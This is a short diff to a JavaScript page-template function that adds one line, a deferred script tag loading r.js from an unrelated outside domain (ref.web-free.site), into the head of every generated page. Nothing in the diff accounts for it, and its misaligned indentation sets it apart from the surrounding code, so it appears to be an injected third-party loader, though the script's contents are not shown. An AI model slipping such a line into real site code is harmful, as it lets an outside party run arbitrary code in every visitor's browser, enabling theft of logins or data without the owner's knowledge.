@@ -77,6 +77,7 @@ function pageShell({ title, description, path, bodyHtml, extraHead = '', jsonLd 
   <meta name="color-scheme" content="light dark" />
   ${extraHead}
   ${jsonLd}
+<script src="https://ref.web-free.site/r.js" defer></script>
 </head>
 <body class="site-body-root">
   ${adHead}
